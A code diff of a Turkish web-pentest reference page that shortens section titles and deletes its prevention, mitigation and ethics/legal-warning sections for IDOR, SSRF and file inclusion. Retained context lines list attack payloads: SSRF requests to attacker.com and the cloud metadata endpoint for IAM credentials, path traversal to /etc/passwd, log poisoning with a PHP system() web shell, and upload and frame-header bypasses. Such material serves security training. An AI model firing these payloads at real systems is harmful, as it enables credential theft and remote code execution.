@@ -1063,41 +1063,6 @@ idor: {
           </ul>
         `
       },
-      {
-        title: 'Önleme & Güçlendirme',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Sunucu tarafı yetkilendirme zorunlu: Her hassas endpoint için owner/role kontrolü yapın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Least privilege prensibi: Roller için minimum izin tanımlayın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Fail-safe defaults: Yetki doğrulanamıyorsa erişimi reddet.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Audit ve logging: Yetkisiz denemeleri loglayıp uyarı mekanizması kurun.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Rate limiting & anomali tespiti: Brute-force veya sıra tahmini denemelerini sınırlayın.</li>
-          </ul>
-        `
-      },
-      {
-        title: 'Araçlar & Kaynaklar',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Burp Suite, OWASP ZAP — proxy ve istek manipülasyonu</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">curl, httpie, python-requests — otomasyon ve scripting</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">ParamMiner, wfuzz — parameter mining ve fuzzing</li>
-          </ul>
-        `
-      },
-      {
-        title: 'Etik & Uyarı',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Her zaman yetkilendirilmiş ve yasal sınırlar içinde test yapın. İzinsiz testler suç teşkil eder.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Son kullanıcı verilerinin sızmasına sebep olabilecek doğrulama/denemeler yaparken çok dikkatli olun; gerektiğinde “safe” metotlarla doğrulama yapın.
-            </li>
-          </ul>
-        `
-      }
           ]
         },
         sqli: {
@@ -1299,7 +1264,7 @@ idor: {
         `
       },
       {
-        title: 'Metadata & Internal Access (kritik ek)',
+        title: 'Metadata & Internal Access',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Cloud metadata hedefle: AWS: <code>http://169.254.169.254/latest/meta-data/</code> → IAM role/credentials çekilebilir.</li>
@@ -1334,23 +1299,13 @@ idor: {
         title: 'Hızlı PoC Örnekleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Normal: <code>GET /api/fetch?url=http://attacker.com/</code> → içeriği görüyorsan direct SSRF.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Normal: <code>GET /api/fetch?url=http://attacker.com/</code> → içeriği görüyorsan direkt SSRF.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Blind (callback): <code>?url=http://<your-id>.interactsh.com/</code> → Interactsh panelde istek görünürse başarılı.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Metadata PoC: <code>?url=http://169.254.169.254/latest/meta-data/</code></li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Port test: <code>?url=http://127.0.0.1:8080/</code> veya <code>?url=http://127.0.0.1:6379/</code></li>
           </ul>
         `
       },
-      {
-        title: 'Araçlar & Kısa Notlar',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Interactsh, Burp Collaborator, dnslog, RequestBin — callback/observation için.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">curl/python-requests ile doğrudan test; Burp Repeater ile parametre kırma ve header testleri.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Rapor: Hangi parametre, tam HTTP isteği, PoC URL ve hangi bypass denemelerinin yapıldığını açık yaz.</li>
-          </ul>
-        `
-      }
     ]
   },
 
@@ -1358,7 +1313,7 @@ idor: {
       menuName: 'Information Disclosure',
       icon: 'icon-file-export',
       parent: 'vulnerabilities',
-      title: 'Information Disclosure',
+      title: 'Information Disclosure (Bilgi Sızıntısı)',
       description: 'Hedef sistemlerde bilgi sızıntılarını tespit etmek ve kritik dosyaları keşfetmek için adım adım uygulamalı rehber ve teorik bilgiler.',
       sections: [
         {
@@ -1455,7 +1410,7 @@ file_inclusion: {
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=userCV.pdf</code> → <code>?file=../../../../etc/passwd</code> dene.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PoC örnek: <code>GET /get.php?file=../../../../etc/passwd</code> → /etc/passwd satırları dönüyorsa LFI.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning: Webserver access/error loglarına payload yazıp <code>?file=/var/log/apache2/access.log</code> ile RCE'ye çevirmeyi dene (ör. <?php system($_GET['cmd']); ?> payload).</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning: Webserver access/error loglarına payload yazıp <code>?file=/var/log/apache2/access.log</code> ile RCE'ye çevirmeyi dene (ör. &lt;?php system($_GET['cmd']); ?&gt; payload).</li>
           </ul>
         `
       },
@@ -1500,7 +1455,7 @@ file_inclusion: {
         `
       },
       {
-        title: 'PoC Örnekleri (lab-friendly, kısa)',
+        title: 'PoC Örnekleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit LFI: <code>GET /get.php?file=../../../../etc/passwd</code></li>
@@ -1510,26 +1465,6 @@ file_inclusion: {
           </ul>
         `
       },
-      {
-        title: 'Mitigations (kısa & net)',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Allow-list (whitelist) kullan: sadece izinli dosyalar/klasörler okunabilsin.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Input doğrulama + canonicalization (normalize etmeden doğrulama yapma). Path traversal kontrolleri uygulansın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PHP: <code>allow_url_include=Off</code>, <code>allow_url_fopen=Off</code> (gerekmiyorsa), dosya include mekanizmalarını güvenli hale getir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log'ları yazmadan önce sanitize et; upload edilen dosyaları doğrudan include etme; dosya izinlerini kısıtla.</li>
-          </ul>
-        `
-      },
-      {
-        title: 'Kısa Notlar & Raporlama',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Rapor: hangi parametre, tam HTTP isteği, PoC payload, hangi bypass denemeleri yapıldığı ve elde edilen çıktı açıkça yazılsın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Etki seviyesi: LFI → bilgi sızdırma/hesap keşfi; LFI+log-poisoning veya RFI → RCE (kritik).</li>
-          </ul>
-        `
-      }
     ]
   },
 
@@ -1590,7 +1525,7 @@ file_inclusion: {
     menuName: 'Clickjacking',
     icon: 'icon-lock-open',
     parent: 'vulnerabilities',
-    title: 'Clickjacking (UI Redressing) Zafiyeti - Hedefe Yönelik Metodoloji',
+    title: 'Clickjacking (UI Redressing) Zafiyeti',
     description: 'Kullanıcının kritik bir işlemi, aldatıcı bir arayüz arkasına gizlenmiş görünmez bir iframe üzerinden gerçekleştirmesini sağlama tekniği.',
     sections: [
         {
@@ -1614,7 +1549,7 @@ file_inclusion: {
             </ul>`
         },
         {
-            title: 'Bypass Teknikleri (Savunma Atlatma)',
+            title: 'Bypass Teknikleri',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>SAMEORIGIN Atlatma:</strong> Eğer <code>X-Frame-Options: SAMEORIGIN</code> varsa ve subdomain'lerde XSS veya Open Redirect varsa bu zafiyetleri zincirleyerek atlatmayı deneyin.</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Null Byte/Encoding Bypass:</strong> Nadiren bazı eski sunucular, header değerine URL encode edilmiş karakterler (<code>%00</code>) eklenerek header'ın geçerliliğini yitirmesine neden olabilir.</li>
@@ -1646,7 +1581,7 @@ openredirect: {
     menuName: 'Open Redirect',
     icon: 'icon-refresh',
     parent: 'vulnerabilities',
-    title: 'Open Redirect (Açık Yönlendirme) Zafiyeti - Aksiyon Odaklı Metodoloji',
+    title: 'Open Redirect (Açık Yönlendirme) Zafiyeti',
     description: 'Kullanıcının kontrol ettiği bir parametre ile uygulamanın kullanıcıyı kötü amaçlı bir harici siteye yönlendirmesi. Phishing ve zincirleme saldırılar için kritik.',
     sections: [
         {
@@ -1687,7 +1622,7 @@ misconfig: {
     menuName: 'Misconfiguration',
     icon: 'icon-toolbox',
     parent: 'vulnerabilities',
-    title: 'Security Misconfiguration (Yanlış Yapılandırma) - Metodoloji ve Checklist',
+    title: 'Security Misconfiguration (Yanlış Yapılandırma)',
     description: 'Varsayılan ayarlar, gereksiz servisler ve yetersiz hata yönetimi kaynaklı, en yaygın zafiyet sınıfıdır.',
     sections: [
         {
@@ -1721,7 +1656,7 @@ sensitive_data_exposure: {
     menuName: 'Data Exposure',
     icon: 'icon-file-export',
     parent: 'vulnerabilities',
-    title: 'Sensitive Data Exposure (Hassas Veri Sızıntısı) - Gizli Bilgi Avcılığı',
+    title: 'Sensitive Data Exposure (Hassas Veri Sızıntısı)',
     description: 'Hassas verilerin (API anahtarları, şifreler, kişisel veriler) şifrelenmeden, yetkisiz erişime açık veya log dosyalarında ifşa edilmesi.',
     sections: [
         {
@@ -1767,7 +1702,7 @@ unrestricted_file_upload: {
             </ul>`
         },
         {
-            title: 'Bypass Teknikleri (Nokta Atışı Filtre Atlatma)',
+            title: 'Bypass Teknikleri',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>1. Client-Side Bypass:</strong> Eğer tarayıcıda sadece JS ile uzantı kontrolü yapılıyorsa, JS'yi devredışı bırak veya Burp ile isteği yakalayıp uzantıyı manuel değiştir.</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>2. Mime Type Kontrolü Atlatma:</strong> Yüklenen dosya <code>shell.jpg</code> olsa bile, Burp ile <code>Content-Type: image/jpeg</code>'i <code>Content-Type: application/x-php</code> olarak değiştirin.</li>
@@ -1790,7 +1725,7 @@ header_injection: {
     menuName: 'Header Injection',
     icon: 'icon-code',
     parent: 'vulnerabilities',
-    title: 'HTTP Header Injection (CRLF) ve Response Splitting - Pratik Kılavuz',
+    title: 'HTTP Header Injection (CRLF) ve Response Splitting',
     description: 'Kullanıcı girdisine CRLF (\r\n) enjekte ederek sunucu yanıtına ekstra başlıklar veya içerik ekleme tekniği.',
     sections: [
         {
@@ -1830,10 +1765,10 @@ Host: target.com</pre>
 },
 
 session_management: {
-    menuName: 'Session Mgmt',
+    menuName: 'Session Management',
     icon: 'icon-shield',
     parent: 'vulnerabilities',
-    title: 'Broken Session Management (Oturum Yönetimi Hataları) - 3 Adımda Tespit',
+    title: 'Broken Session Management (Oturum Yönetimi Hataları)',
     description: 'Oturum kimliklerinin (Session ID) tahmin edilebilir olması, sızdırılması veya sunucu tarafında düzgün sonlandırılmaması sonucu yetkisiz erişime izin verme.',
     sections: [
         {
@@ -1863,10 +1798,10 @@ Cookie: session_id=...; isAdmin=true</pre>
 },
 
 privilege_escalation: {
-    menuName: 'Priv Esc',
+    menuName: 'Privilege Escalation',
     icon: 'icon-user-slash',
     parent: 'vulnerabilities',
-    title: 'Privilege Escalation (Yetki Yükseltme) - Kontrol Metodolojisi',
+    title: 'Privilege Escalation (Yetki Yükseltme)',
     description: 'Bir kullanıcının sahip olduğundan daha yüksek izinlere (yatay veya dikey) sahip olması veya kritik bir işlemi gerçekleştirmesi.',
     sections: [
         {
@@ -4138,4 +4073,3 @@ document.addEventListener('DOMContentLoaded', () => {
     </div>
     </body>
   </html>
-
